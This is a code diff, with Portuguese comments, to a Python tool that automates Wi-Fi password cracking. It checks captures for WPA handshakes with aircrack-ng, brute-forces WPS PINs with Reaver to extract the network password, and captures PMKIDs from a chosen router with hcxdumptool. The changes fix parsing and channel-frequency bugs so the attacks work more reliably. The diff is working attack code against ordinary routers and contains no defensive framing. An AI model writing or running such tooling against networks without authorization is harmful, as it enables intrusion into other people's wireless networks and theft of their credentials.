@@ -326,7 +326,8 @@ class Engine:
         if not capfile:
             return False
         r = subprocess.run(["aircrack-ng", str(capfile)], capture_output=True, text=True)
-        return "1 handshake" in r.stdout.lower()
+        # aircrack-ng mostra "1 handshake", "2 handshakes", etc. — casar qualquer número.
+        return bool(re.search(r"\d+ handshake", r.stdout.lower()))
 
     # ------------------------------------------------------------------
     # 5. captura de handshake (unificada: já conectado OU vai conectar agora)
@@ -467,19 +468,19 @@ class Engine:
 
         if chegou_m1:
             self.log("Pixie Dust falhou mas AP respondeu. Tentando brute de PIN (mais lento)...")
-            log_path2 = WORKDIR / "reaver_pin_gui.log"
-            self.run(
+            # self.run() captura a saída e a retorna — parsear o stdout/stderr
+            # do próprio comando (o arquivo reaver_pin_gui.log nunca era escrito).
+            r = self.run(
                 ["timeout", "300", "reaver", "-i", self.moniface, "-b", self.target["bssid"],
                  "-c", str(self.target["ch"]), "-vv", "-d", "15"],
             )
-            if log_path2.exists():
-                texto2 = log_path2.read_text(errors="replace")
-                m2 = re.search(r"WPA PSK:\s*'?([^'\n]*)'?", texto2)
-                if m2:
-                    self.senha = m2.group(1).strip()
-                    self.rota_usada = "WPS (brute PIN)"
-                    self.log(f"Senha encontrada via brute de PIN: {self.senha}")
-                    return True
+            texto2 = (r.stdout or "") + (r.stderr or "")
+            m2 = re.search(r"WPA PSK:\s*'?([^'\n]*)'?", texto2)
+            if m2:
+                self.senha = m2.group(1).strip()
+                self.rota_usada = "WPS (brute PIN)"
+                self.log(f"Senha encontrada via brute de PIN: {self.senha}")
+                return True
 
         self.log("Rota WPS não teve sucesso.")
         return False
@@ -519,12 +520,22 @@ class Engine:
         self.run(["airmon-ng", "stop", self.moniface])
         time.sleep(1)
 
-        banda_sufixo = "b" if self.target.get("freq_label") == "5 GHz" else "a"
-        self.log(f"Tentando capturar PMKID direto do roteador por 30s (canal {self.target['ch']}{banda_sufixo})...")
+        # -c aceita canal (<=1000) ou frequência em MHz (>1000); usamos a
+        # frequência pra não depender do sufixo de banda (convenção a/b é
+        # ambígua e varia entre versões). -w (não -o) é o flag de saída no
+        # hcxdumptool >= 6.3.0 / 7.x (Ubuntu/Kali atuais).
+        ch_int = int(self.target["ch"]) if str(self.target["ch"]).isdigit() else 0
+        if self.target.get("freq_label") == "5 GHz":
+            freq_mhz = 5000 + ch_int * 5
+        elif ch_int == 14:
+            freq_mhz = 2484
+        else:
+            freq_mhz = 2407 + ch_int * 5
+        self.log(f"Tentando capturar PMKID direto do roteador por 30s (canal {self.target['ch']}, {freq_mhz} MHz)...")
         try:
             subprocess.run(
-                ["hcxdumptool", "-i", self.iface, "-o", str(pmkid_cap),
-                 f"--bpf={bpf_file}", "-c", f"{self.target['ch']}{banda_sufixo}"],
+                ["hcxdumptool", "-i", self.iface, "-w", str(pmkid_cap),
+                 f"--bpf={bpf_file}", "-c", str(freq_mhz)],
                 timeout=30, capture_output=True,
             )
         except subprocess.TimeoutExpired:
